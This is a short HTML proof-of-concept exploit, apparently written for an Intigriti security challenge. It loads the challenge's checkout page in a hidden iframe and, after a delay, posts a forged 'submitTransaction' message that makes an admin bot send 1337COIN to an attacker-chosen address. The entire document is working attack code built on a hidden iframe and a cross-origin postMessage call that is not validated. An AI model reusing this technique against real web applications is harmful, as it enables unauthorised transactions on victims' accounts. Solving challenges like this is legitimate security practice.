<!DOCTYPE html>
<html>
<body>
<script>
/*
  Phase 1 PoC
  Goal: Confirm admin bot can create a 1337COIN transaction
*/

const MARKER = "198fbdef2cae64a978b0998df98e09acbd";

// 1️⃣ Open checkout as admin
const iframe = document.createElement("iframe");
iframe.style.display = "none";
iframe.src =
  "https://challenge-0126.intigriti.io/checkout.html" +
  "?currency=1337COIN&price=1";

document.body.appendChild(iframe);

// 2️⃣ Wait for checkout + wallet load
setTimeout(() => {
  // 3️⃣ Force transaction submission
  iframe.contentWindow.postMessage({
    type: "submitTransaction",
    transaction: {
      toAddress: MARKER,
      currency: "1337COIN",
      amount: 1
    }
  }, "*");
}, 5000);
</script>
</body>
</html>
